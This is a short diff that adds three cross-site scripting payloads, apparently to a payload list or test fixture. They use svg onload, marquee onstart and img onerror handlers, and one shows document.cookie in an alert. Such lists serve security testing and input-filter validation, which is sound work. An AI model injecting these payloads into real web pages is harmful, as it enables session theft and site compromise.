@@ -1,0 +1,3 @@
+'"><svg onload=alert(3);
+"><u>XSS Vulnerability</u><marquee+onstart='alert(document.cookie)'>XSS
+„> <img src = x onerror = javascript: alert (1);
